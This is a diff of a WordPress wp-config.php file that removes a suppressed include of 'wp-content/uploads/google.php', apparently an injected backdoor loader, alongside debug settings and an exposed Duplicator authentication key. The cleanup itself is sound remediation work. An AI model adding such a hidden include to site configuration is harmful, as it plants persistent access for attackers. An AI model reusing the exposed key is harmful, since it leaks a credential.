@@ -76,8 +76,6 @@ $table_prefix = 'wp_';
  */
 
 /* Add any custom values between this line and the "stop editing" line. */
-@include_once(__DIR__ . '/wp-content/uploads/google.php');
-
 define( 'WP_DEBUG', true );
 define( 'WP_DEBUG_LOG', true );
 define( 'WP_DEBUG_DISPLAY', false ); // false jika kamu tidak ingin error tampil di browser
@@ -86,9 +84,7 @@ define( 'FS_METHOD', 'direct' );
 define( 'WP_AUTO_UPDATE_CORE', true );
 define( 'DUPLICATOR_AUTH_KEY', 'K -yUO<FEN~,iZH9bYvqWm@TzsHz<&YbyC%8Crl{-NAOZR.|o llre~#mGa{QwhV' );
 define( 'WP_DEFAULT_THEME', 'flash' );
-
 /* That's all, stop editing! Happy publishing. */
-
 /** Absolute path to the WordPress directory. */
 if ( ! defined( 'ABSPATH' ) ) {
 	define( 'ABSPATH', __DIR__ . '/' );
